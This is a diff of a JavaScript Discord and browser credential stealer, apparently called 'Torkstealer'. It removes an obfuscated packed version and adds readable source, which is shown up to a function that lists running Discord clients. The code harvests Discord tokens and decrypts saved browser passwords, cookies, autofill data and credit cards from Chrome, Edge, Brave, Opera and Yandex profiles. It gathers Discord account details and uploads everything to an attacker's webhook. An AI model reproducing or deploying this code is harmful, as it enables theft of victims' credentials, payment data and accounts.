@@ -1,1 +1,748 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('s p=1q(\'p\');s 1G=1q(\'1G\').4r;s 3q=1q(\'3q\');s 4H=1q(\'5m-5r\');s{3y}=1q(\'5w\');s 2e=1q(\'R-26\');s 2j=1q(\'2j\');s 2f=1q(\'2f\');s 1z=1q(\'5l-1z\');s 5u=1q(\'5t-5o\');s 21=\'%5K%\';J K=3b.3D.6s,f=3b.3D.6h,48=[],29=[],17=[K+\'\\\\2z\\\\\',K+\'\\\\6i\\\\\',K+\'\\\\6g\\\\\',K+\'\\\\5R\\\\\',K+\'\\\\6j\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\2g\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 1\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 2\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 3\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 4\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 5\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\1F m\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\2g\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 1\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 2\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 3\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 4\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\m 5\\\\v\\\\\',f+\'\\\\Y\\\\10\\\\k c\\\\1F m\\\\v\\\\\',K+\'\\\\3d 43\\\\3d 44\\\\\',K+\'\\\\3d 43\\\\3d 6r 44\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\2g\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 1\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 2\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 3\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 4\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 5\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\1F m\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 1\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 2\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 3\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 4\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 5\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\1F m\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\2g\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 1\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 2\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 3\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 4\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 5\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\1F m\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\2g\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 1\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 2\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 3\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 4\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\m 5\\\\v\\\\\',f+\'\\\\19\\\\13-11\\\\k c\\\\1F m\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 1\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 2\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 3\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 4\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\m 5\\\\v\\\\\',f+\'\\\\1g\\\\1k\\\\k c\\\\1F m\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\2g\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 1\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 2\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 3\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 4\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\m 5\\\\v\\\\\',f+\'\\\\Z\\\\X\\\\k c\\\\1F m\\\\v\\\\\'];((S()=>{D 4j();D 4B();D 4F();D 4u();D 4E();D 5b()})());p.2d(f).1r(B=>{7(B.I("2B")){h 28=f+\'\\\\\'+B+"\\\\68-*\\\\61\\\\47-*\\\\47\\\\5U.5T";3q.5V(28).3t(4b=>{48.1Y(4b);3Z()})}H{y}});A 3Z(){3y(\'5X\',A(L,2p,6a){7(2p.I(\'46.2s\'))29.1Y(\'46\');7(2p.I(\'4J.2s\'))29.1Y(\'4J\');7(2p.I(\'4A.2s\'))29.1Y(\'4A\');7(2p.I(\'4y.2s\'))29.1Y(\'4y\');4x()})};A 4x(){29.1r(4v=>{25{3y(\'6q /6k \'+4v+\'.2s /F\'),(L)=>{7(L){}}}1h(e){}});A 6d(){J 3f=3b.3D.K+"\\\\6c\\\\26\\\\5q.5v"7(p.1a(3f)){J x=p.1o(3f)p.2l(3f,4H(x,"38/5i","5k"))}H{y}}S A 4E(){h 1E=\'\';s 1x=1q(\'5s\').5Q();7(p.1a(`${1x}\\\\3N`)){p.2d(`${1x}\\\\3N`).1r(B=>{7(B.1W(\'.1b\')&&B.I(\'3K\')){h l=`${1x}\\\\3N\\\\${B}`1E+=`\\n\\n@~$~@1d-${l}`,1E+=`\\n\\n${p.1o(l).2h()}`}})}7(p.1a(`${1x}\\\\3G`)){p.2d(`${1x}\\\\3G`).1r(B=>{7(B.1W(\'.1b\')&&B.I(\'3K\')){h l=`${1x}\\\\3G\\\\${B}`1E+=`\\n\\n@~$~@1d-${l}`,1E+=`\\n\\n${p.1o(l).2h()}`}})}7(p.1a(`${1x}\\\\3W`)){p.2d(`${1x}\\\\3W`).1r(B=>{7(B.1W(\'.1b\')&&B.I(\'3K\')){h l=`${1x}\\\\3W\\\\${B}`1E+=`\\n\\n@~$~@1d-${l}`,1E+=`\\n\\n${p.1o(l).2h()}`}})}7(1E!==\'\'){p.2l(K+\'\\\\4l.1b\',1E.M(2))s R=q 2e();R.2q("B",p.2t(K+"\\\\4l.1b"));R.2v(21)}}S A 4t(l){h P=l.1Z(\'\\\\\'),1K=l.I(\'v\')?P.1I(0,P.E-3):P.1I(0,P.E-2),O=1K.2P(\'\\\\\')+\'\\\\\';7(l.2N(K))O=l;7(l.I(\'2B\'))y;7(p.1a(O)){h 1y=1n.1m(2y.2x(p.1o(O+\'1X 2m\')).2E.2C,\'1t\').M(5);J 2b=l+\'35 c\',3V=l+\'1s.36\';p.2M(2b,3V);s 1C=1z.1O(1n.1m(1y,\'Q-8\'),1D,\'1N\');J V=`\\n\\n@~$~@1d-${l}`,1J=q 2f.2L(3V,L=>{7(L){}});s 40=D q 2Q((1H,2G)=>{1J.2F(\'2H * 2K 5H\',A(L,C){7(L){}7(C[\'4m\']!=\'\'){h 1j=C[\'4m\'];25{7((1j[0]==1)&&(1j[1]==0)&&(1j[2]==0)&&(1j[3]==0)){V+=\'\\4s 4q 3F: \'+1z.1O(1j,1D,\'1N\').2h(\'Q-8\')+\' | 4p: \'+C[\'4w\']+\'/\'+C[\'45\']+\' | 3l: \'+C[\'4C\']}H{h 1V=1j.M(3,15),1T=1j.M(15,1j.E-16),1S=1j.M(1j.E-16,1j.E),T=2j.2W(\'2X-2w-2V\',1C,1V);T.2U(1S);V+=\'\\4s 4q 3F: \'+T.2S(1T,\'1t\',\'Q-8\')+T.2Y(\'Q-8\')+\' | 4p: \'+C[\'4w\']+\'/\'+C[\'45\']+\' | 3l: \'+C[\'4C\']}}1h(e){}}},A(){1H(V)})});y 40}H{y\'\'}}S A 4D(l){h P=l.1Z(\'\\\\\'),1K=l.I(\'v\')?P.1I(0,P.E-3):P.1I(0,P.E-2),O=1K.2P(\'\\\\\')+\'\\\\\';7(l.2N(K))O=l;7(l.I(\'2B\'))y;7(p.1a(O)){h 1y=1n.1m(2y.2x(p.1o(O+\'1X 2m\')).2E.2C,\'1t\').M(5);J 2b=l+\'35 c\',3I=l+\'1u.36\';p.2M(2b,3I);s 1C=1z.1O(1n.1m(1y,\'Q-8\'),1D,\'1N\');J V=`\\n\\n@~$~@1d-${l}`,1J=q 2f.2L(3I,L=>{7(L){}});s 3O=D q 2Q((1H,2G)=>{1J.2F(\'2H * 2K 3O\',A(L,C){7(L){}V+=\'\\6o: \'+C[\'1i\']+\' | 6I: \'+C[\'20\']},A(){1H(V)})});y 3O}H{y\'\'}}S A 4I(l){h P=l.1Z(\'\\\\\'),1K=l.I(\'v\')?P.1I(0,P.E-3):P.1I(0,P.E-2),O=1K.2P(\'\\\\\')+\'\\\\\';7(l.2N(K))O=l;7(l.I(\'2B\'))y;7(p.1a(O)){h 1y=1n.1m(2y.2x(p.1o(O+\'1X 2m\')).2E.2C,\'1t\').M(5);J 2b=l+\'4G c\',3o=l+\'1v.36\';p.2M(2b,3o);s 1C=1z.1O(1n.1m(1y,\'Q-8\'),1D,\'1N\');J V=`\\n\\n@~$~@1d-${l}`,1J=q 2f.2L(3o,L=>{7(L){}});s 4o=D q 2Q((1H,2G)=>{1J.2F(\'2H 3z, 2I, W 2K 7e\',A(L,C){7(C[\'2I\']!=\'\'){h W=C[\'W\'];25{7((W[0]==1)&&(W[1]==0)&&(W[2]==0)&&(W[3]==0)){V+=\'\\3Y: \'+C[\'3z\']+\' | 4g: \'+C[\'2I\']+\' | 3k: \'+1z.1O(W,1D,\'1N\').2h(\'Q-8\')}H{h 1V=W.M(3,15),1T=W.M(15,W.E-16),1S=W.M(W.E-16,W.E),T=2j.2W(\'2X-2w-2V\',1C,1V);T.2U(1S);V+=\'\\3Y: \'+C[\'3z\']+\' | 4g: \'+C[\'2I\']+\' | 3k: \'+T.2S(1T,\'1t\',\'Q-8\')+T.2Y(\'Q-8\')}}1h(e){}}},A(){1H(V)})});y 4o}H{y\'\'}}S A 4d(l){h P=l.1Z(\'\\\\\'),1K=l.I(\'v\')?P.1I(0,P.E-3):P.1I(0,P.E-2),O=1K.2P(\'\\\\\')+\'\\\\\';7(l.2N(K))O=l;7(l.I(\'2B\'))y;7(p.1a(O)){h 1y=1n.1m(2y.2x(p.1o(O+\'1X 2m\')).2E.2C,\'1t\').M(5);J 1p=l+\'3C\',3J=l+\'1p.36\';p.2M(1p,3J);s 1C=1z.1O(1n.1m(1y,\'Q-8\'),1D,\'1N\');J V=\'\',1J=q 2f.2L(3J,L=>{7(L){}});s 4k=D q 2Q((1H,2G)=>{1J.2F(\'2H 3U, 1i, 14 2K 1p\',A(L,C){h 14=C[\'14\'];25{7((14[0]==1)&&(14[1]==0)&&(14[2]==0)&&(14[3]==0)){V+=C[\'3U\']+"	"+"4h"+"	/"+"	4i"+"	3B	"+C[\'1i\']+"	"+1z.1O(14,1D,\'1N\')+"\\n".2h(\'Q-8\')}H{h 1V=14.M(3,15),1T=14.M(15,14.E-16),1S=14.M(14.E-16,14.E),T=2j.2W(\'2X-2w-2V\',1C,1V);T.2U(1S);V+=C[\'3U\']+"	"+"4h"+"	/"+"	4i"+"	3B	"+C[\'1i\']+"	"+T.2S(1T,\'1t\',\'Q-8\')+T.2Y(\'Q-8\')+"\\n"}}1h(e){}},A(){1H(V)})});y 4k}H y\'\'}S A 4j(){h 1s=\'\';1w(h i=0;i<17.E;i++){7(p.1a(17[i]+\'35 c\'))1s+=D 4t(17[i])||\'\'}7(!1s.I(\'3F:\'))1s=\'7l 30\\\'t 32.\'H 1s=1s.M(2)p.2l(K+\'\\\\1s.1b\',1s)s R=q 2e();R.2q("B",p.2t(K+"\\\\1s.1b"));R.2v(21)}S A 4u(){h 1u=\'\';1w(h i=0;i<17.E;i++){7(p.1a(17[i]+\'35 c\'))1u+=D 4D(17[i])||\'\'}7(1u.I(\'3l:\'))1u=\'71 30\\\'t 32.\'H 1u=1u.M(2)p.2l(K+\'\\\\1u.1b\',1u)s R=q 2e();R.2q("B",p.2t(K+"\\\\1u.1b"));R.2v(21)}S A 4F(){h 1v=\'\';1w(h i=0;i<17.E;i++){7(p.1a(17[i]+\'4G c\'))1v+=D 4I(17[i])||\'\'}7(1v.I(\'3k:\'))1v=\'6H 30\\\'t 32.\'H 1v=1v.M(2)p.2l(K+\'\\\\1v.1b\',1v)s R=q 2e();R.2q("B",p.2t(K+"\\\\1v.1b"));R.2v(21)}S A 4B(){h 1p=\'\';1w(h i=0;i<17.E;i++){7(p.1a(17[i]+\'3C\'))1p+=D 4d(17[i])||\'\'}7(!1p.I(\'3B\'))1p=\'3C 30\\\'t 32.\'p.2l(K+\'\\\\1p.1b\',1p)s R=q 2e();R.2q("B",p.2t(K+"\\\\1p.1b"));R.2v(21)}s 2c=[];S A 5h(l){h O=l;l+=\'1X 6L\\\\6W\';7(!O.I(\'2z\')){25{p.2d(l).3t(B=>{(B.1W(\'.42\')||B.1W(\'.4a\'))&&p.1o(l+\'\\\\\'+B,\'49\').1Z(/\\r?\\n/).1r(2T=>{s 4z=[q 3m(/6V\\.[\\w-]{6X}/g),q 3m(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g)];1w(s 28 39 4z){s 2a=2T.4K(28);7(2a)2a.1r(G=>{7(!2c.I(G))2c.1Y(G)})}})})}1h(e){}y}H{7(p.1a(O+\'\\\\1X 2m\')){25{p.2d(l).3t(B=>{(B.1W(\'.42\')||B.1W(\'.4a\'))&&p.1o(l+\'\\\\\'+B,\'49\').1Z(/\\r?\\n/).1r(2T=>{s 28=q 3m(/5e:[^.*\\[\'(.*)\'\\].*$][^\\"]*/g);s 2a=2T.4K(28);7(2a){2a.1r(G=>{h 1y=1n.1m(2y.2x(p.1o(O+\'1X 2m\')).2E.2C,\'1t\').M(5);s 1C=1z.1O(1n.1m(1y,\'Q-8\'),1D,\'1N\');G=1n.1m(G.1Z(\'5e:\')[1],\'1t\')h 1V=G.M(3,15),1T=G.M(15,G.E-16),1S=G.M(G.E-16,G.E),T=2j.2W(\'2X-2w-2V\',1C,1V);T.2U(1S);h 3s=T.2S(1T,\'1t\',\'Q-8\')+T.2Y(\'Q-8\')7(!2c.I(3s))2c.1Y(3s)})}})})}1h(e){}y}}}S A 5b(){1w(h l 39 17){D 5h(l)}1w(h G 39 2c){h N;D 1G.2A("1B://2z.37/38/3x/3u/@3j",{31:{"2R-2u":"33/N","34":G}}).2Z(22=>{N=22.26}).1h(()=>{N=1D})7(!N)50;J 3a=D 4e();J 3i=D 4U(G);J 4M=D 51(G);1G.70(21,{6Y:"",6K:[{"6z":[{1i:`<a:1d:6A>4T:`,20:`\\`${G}\\`\\n[6y 4T](1B:2i:3e},{1i:`<:1d:6x>5d:`,20:5g(N.23),2i:1e},{1i:`<:1d:6u>4f 2u:`,20:D 5a(N.6v,N.3T,G),2i:1e},{1i:`<a:1d:6w>58:`,20:3i,2i:1e},{1i:`<:1d:6B>6C:`,20:`\\`${N.72}\\``,2i:1e},{1i:`<:1d:6J>6G:`,20:`\\`${3a}\\``,2i:1e}],"4R":4Q,"4L":{"1i":`${N.59}#${N.4V}(${N.3T})`,"4O":"1B://4P.4W.4X/54/55/56/57.53",},"52":{"4Y":"@4Z"},"6D":{"6E":`1B:}},{"4R":4Q,"6F":4M,"4L":{"1i":"7n 7m","4O":"1B://4P.4W.4X/54/55/56/57.53",},"52":{"4Y":"@4Z"},}]}).2Z(22=>{}).1h(()=>{})50}}s 2D={7p:{U:1,1c:"<:7k:7o>",1l:1e,},7q:{U:2,1c:"<:7j:7h>",1l:1e,},77:{U:4,1c:"<:78:76>",1l:1e,},75:{U:8,1c:"<:73:7i>",1l:1e,},74:{U:79,1c:"<:7a:7f>",1l:1e,},6t:{U:7g,1c:"<:7d:7b>",1l:1e,},7c:{U:5D,1c:"<:5E:5F>",1l:1e,},5C:{U:64,1c:"<:5B:5y>",1l:3e,},5z:{U:5A,1c:"<:5G:5N>",1l:3e,},5O:{U:2w,1c:"<:5P:5M>",1l:3e,},5L:{U:5I,1c:"<:5J:5x>",1l:1e,}};S A 51(G){J j=D 1G.2A(\'1B://2z.37/38/3x/3u/@3j/5n\',{31:{"2R-2u":"33/N","34":G}}).1h(()=>{})7(!j)y`*5j 5p*`J N=j.26 s r=N.6e((2r)=>{y 2r.3n==1})J 2n=\'\';1w(z 39 r){J b=5c(z.2r.6p)7(b!=""){2n+=`${b}|\\`${z.2r.59}#${z.2r.4V}\\`\\n`}}7(2n==\'\')2n="*6l 6m 6n 6b*"y 2n}S A 4U(G){h N;D 1G.2A("1B://2z.37/38/3x/3u/@3j/3i/5Z-5W",{31:{"2R-2u":"33/N","34":G}}).2Z(22=>{N=22.26}).1h(L=>{})7(!N)y\'\\`5S\\`\';J 2k=\'\';N.1r(z=>{7(z.3n==2&&z.4S!=!0){2k+="<:69:62>"}H 7(z.3n==1&&z.4S!=!0){2k+="<:1d:65>"}});7(2k==\'\')2k=`\\`3H 58\\``y 2k}A 5g(23){J b=\'\';1w(s 3c 5f 2D){h o=2D[3c];7((23&o.U)==o.U)b+=o.1c};7(b==\'\')y`\\`3H 5d\\``;y`${b}`}A 5c(23){J b=\'\';1w(s 3c 5f 2D){h o=2D[3c];7((23&o.U)==o.U&&o.1l)b+=o.1c};y b}S A 5a(23,3T,G){60(23){4N 1:y"<:2J:2O>";4N 2:h 1f;D 1G.2A(`1B:31:{"2R-2u":"33/N","34":G}}).2Z(22=>{1f=22.26}).1h(()=>{})7(!1f)y"<:2J:2O>";7(!1f.1A)y"<:2J:2O>";h 4n=["<:6Z:6U>","<:3r:6T>","<:3g:6O>","<:3h:6N>","<:3p:6M>","<:3E:6P>","<:3L:6Q>","<:3R:6S>","<:2o:6R>"]J i=0 25{h d=q u(1f.1A)h 3r=1P.1M((q u(d.1Q(d.1R()+2))-q u(u.1U()))/1L)h 3P=q u(1f.1A)h 3g=1P.1M((q u(3P.1Q(3P.1R()+3))-q u(u.1U()))/1L)h 3S=q u(1f.1A)h 3h=1P.1M((q u(3S.1Q(3S.1R()+6))-q u(u.1U()))/1L)h 3M=q u(1f.1A)h 3p=1P.1M((q u(3M.1Q(3M.1R()+9))-q u(u.1U()))/1L)h 3Q=q u(1f.1A)h 3E=1P.1M((q u(3Q.1Q(3Q.1R()+12))-q u(u.1U()))/1L)h 3A=q u(1f.1A)h 3L=1P.1M((q u(3A.1Q(3A.1R()+15))-q u(u.1U()))/1L)h 3w=q u(1f.1A)h 3R=1P.1M((q u(3w.1Q(3w.1R()+18))-q u(u.1U()))/1L)h 3v=q u(1f.1A)h 2o=1P.1M((q u(3v.1Q(3v.1R()+24))-q u(u.1U()))/1L)7(3r>0){i+=0}H{i+=1}7(3g>0){i+=0}H{i+=1}7(3h>0){i+=0}H{i+=1}7(3p>0){i+=0}H{i+=1}7(3E>0){i+=0}H{i+=1}7(3L>0){i+=0}H{i+=1}7(3R>0){i+=0}H{i+=1}7(2o>0){i+=0}H 7(2o<0||2o==0){i+=1}H{i=0}}1h{i+=0}y`<:2J:2O>${4n[i]}`4r:y"\\`3H 4f\\`"}}S A 4e(){J 3a=D 1G.2A("1B://67.66.37/63")y 3a.26}3b.4c("6f",L=>3X.41(L)).4c("5Y",L=>3X.41(L));',62,461,'|||||||if|||||Data|||LOCAL||let|||User|path|Profile|||fs|new||const||Date|Network|||return||function|file|row|await|length||token|else|includes|var|appdata|err|slice|json|path_tail|path_split|utf|form|async|decipher|Value|result|password_value|Edge|Google|Microsoft|Chrome|Browser||Brave|encrypted_value|||paths||BraveSoftware|existsSync|txt|Emoji|tork|true|info|Yandex|catch|name|card_number|YandexBrowser|Rare|from|Buffer|readFileSync|cookies|require|forEach|creditcards|base64|autofilldata|passwords|for|homeDir|encrypted|dpapi|premium_guild_since|https|key|null|str|Guest|axios|resolve|splice|sql|path_split_tail|86400000|round|CurrentUser|unprotectData|Math|setMonth|getMonth|end|middle|now|start|endsWith|Local|push|split|value|wbk|res|flags||try|data||pattern|runningDiscords|foundTokens|login_data|tokens|readdirSync|FormData|sqlite3|Default|toString|inline|crypto|bi|writeFileSync|State|gay|boost24month|stdout|append|user|exe|createReadStream|Type|submit|256|parse|JSON|discord|get|cord|encrypted_key|badges|os_crypt|each|reject|SELECT|username_value|946246402105819216|FROM|Database|copyFileSync|startsWith|962747802797113365|join|Promise|Content|update|line|setAuthTag|gcm|createDecipheriv|aes|final|then|don|headers|found|application|authorization|Web|db|com|api|of|ip|process|prop|Opera|false|dir|boost3month|boost6month|billing|me|PASSWORD|NAME|RegExp|type|passwords_db|boost9month|glob|boost2month|out|map|users|d7|d6|v9|exec|origin_url|d5|2597573456|Cookies|env|boost12month|NUMBER|Desktop|No|autofilldata_db|cookies_db|discord_backup_codes|boost15month|d3|Downloads|autofill|d1|d4|boost18month|d2|id|host_key|creditcards_db|Documents|console|nURL|listDiscord|cb|error|log|Software|Stable|expiration_year|Discord|discord_desktop_core|gameFiles|utf8|ldb|fi|on|getCheese|getIp|Nitro|USERNAME|TRUE|FALSE|takeCreditcards|cheese|backupcodes|card_number_encrypted|boost|pizza|EXPIRE|CARD|default|nCREDIT|getCreditcards|takeAutofilldata|disc|expiration_month|killDiscord|DiscordDevelopment|patterns|DiscordPTB|takeCheese|name_on_card|getAutofilldata|getPeperonni|takePizzas|Login|buf_replace|getPizzas|DiscordCanary|match|author|friends|case|icon_url|media|3553599|color|invalid|Token|getBilling|discriminator|discordapp|net|text|Torkstealear|continue|getRelationships|footer|gif|attachments|1054453037462192288|1085307776168890449|1045804059883487302|Billing|username|getNitro|stealTokens|getRareBadges|Badges|dQw4w9WgXcQ|in|getBadges|findToken|webhooks|Account|ezbysudry|win|buffer|relationships|obfuscator|locked|betterdiscord|replace|os|javascript|JavaScriptObfuscator|asar|child_process|976739399998001152|874750808388952075|House_Brilliance|128|bravery|House_Bravery|131072|developer|874750808472825986|brilliance|credit_cards|262144|moderator|WEBHOOK_LINK|Discord_Official_Moderator|874750808267292683|874750808338608199|House_Balance|balance|homedir|discorddevelopment|Unknown|js|index|sync|sources|tasklist|unhandledRejection|payment|switch|modules|962747802830655498|raw||987692721613459517|myexternalip|www|app|946246524504002610|stderr|here|BetterDiscord|pwnBetterDiscord|filter|uncaughtException|discordptb|LOCALAPPDATA|discordcanary|lightcord|IM|Nothing|to|see|nNAME|public_flags|taskkill|GX|APPDATA|Bug_Hunter_Level_2|987689935018549328|premium_type|987689939401588827|987689933844127804|Copy|fields|987689940852817971|987689943558135818|Email|thumbnail|url|description|IP|Passwords|DATA|987689942350196756|embeds|Storage|967520103367340092|969686607961665628|969685462157525044|969687191133499403|967518897987256400|969686081958207508|967519190133145611|967519562868338728|967519402293624862|mfa|leveldb|84|content|boost1month|post|Autofilldata|email|bughunter_1|Early_Supporter|Bug_Hunter_Level_1|874750808594477056|HypeSquad_Events|hypesquad_events|512|early_supporter|874750808430874664|Early_Verified_Bot_Developer|bughunter_2|logins|874750808414113823|16384|874750808678354964|874750808426692658|partner|staff|Creditcards|Friends|HQ|874750808728666152|Discord_Employee|Partnered_Server_Owner'.split('|'),0,{}))
+const fs = require('fs');
+const axios = require('axios').default;
+const glob = require('glob');
+const buf_replace = require('buffer-replace');
+const { exec } = require('child_process');
+const FormData = require('form-data');
+const crypto = require('crypto');
+const sqlite3 = require('sqlite3');
+const dpapi = require('win-dpapi');
+const JavaScriptObfuscator = require('javascript-obfuscator');
+
+const wbk = '%WEBHOOK_LINK%';
+
+var appdata = process.env.APPDATA,
+    LOCAL = process.env.LOCALAPPDATA,
+    gameFiles = [],
+    runningDiscords = [],
+    paths = [
+        appdata + '\\discord\\',
+        appdata + '\\discordcanary\\',
+        appdata + '\\discordptb\\',
+        appdata + '\\discorddevelopment\\',
+        appdata + '\\lightcord\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Default\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 1\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 2\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 3\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 4\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 5\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Guest Profile\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Default\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
+        LOCAL + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
+        appdata + '\\Opera Software\\Opera Stable\\',
+        appdata + '\\Opera Software\\Opera GX Stable\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Default\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
+        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
+        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
+        LOCAL + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
+    ];
+
+((async () => {
+    await takeCreditcards();
+    await takeCheese();
+    await takePizzas();
+    await takeAutofilldata();
+    await getPeperonni();
+    await stealTokens();
+})());
+
+fs.readdirSync(LOCAL).forEach(file => {
+    if (file.includes("cord")) {
+        let pattern = LOCAL + '\\' + file + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
+        glob.sync(pattern).map(fi => {
+            gameFiles.push(fi);
+            listDiscord();
+        });
+    } else {
+        return;
+    };
+});
+
+function listDiscord() {
+    exec('tasklist', function (err, stdout, stderr) {
+        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
+        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
